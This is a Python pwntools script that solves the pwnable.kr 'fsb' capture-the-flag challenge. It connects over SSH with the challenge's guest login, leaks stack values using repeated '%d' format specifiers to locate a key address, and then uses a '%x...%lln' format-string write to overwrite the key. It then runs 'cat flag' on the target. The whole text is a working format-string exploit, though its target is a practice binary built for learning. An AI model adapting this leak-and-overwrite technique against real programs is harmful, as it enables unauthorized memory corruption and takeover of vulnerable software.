from pwn import *

shell = ssh(user='fsb', host='pwnable.kr', port=2222, password='guest')
KEY_ADDR = 0x804a060
for _ in range(64):
    io = shell.process('./fsb')
    io.recvline()  # give me some...
    io.sendline(b"%d " * 33)
    leaked_stack = [int(x) for x in io.recvline().split()]

    if KEY_ADDR in leaked_stack:
        key_addr_offset = leaked_stack.index(KEY_ADDR)
        break
    io.close()
else:
    log.error("out of luck, try again :(")

io.recvline()  # give me some...
io.sendline(b"%8x" * key_addr_offset + b"%lln")
io.recvline()  # give me some...
io.sendline(b"whatever")
io.recvline()  # give me some...
io.sendline(b"whatever")
# overwritten key value
io.sendline(str(8 * key_addr_offset).encode("utf-8")+b'\x00')
io.recvuntil(b"Congratz!\n")
io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip().removeprefix('$ '))}'")